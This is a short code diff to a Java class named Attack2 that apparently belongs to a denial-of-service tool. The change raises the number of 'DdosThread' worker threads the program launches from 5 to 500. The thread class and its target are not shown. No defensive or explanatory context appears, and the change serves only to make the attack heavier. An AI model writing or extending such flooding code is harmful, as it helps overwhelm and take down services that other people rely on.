@@ -8,7 +8,7 @@ public class Attack2 {
 
     public void main1(String title) throws Exception {
         System.out.println(title);
-            for (int i = 0; i < 5; i++) {
+            for (int i = 0; i < 500; i++) {
                 DdosThread thread = new DdosThread(title);
                 thread.start();
             }
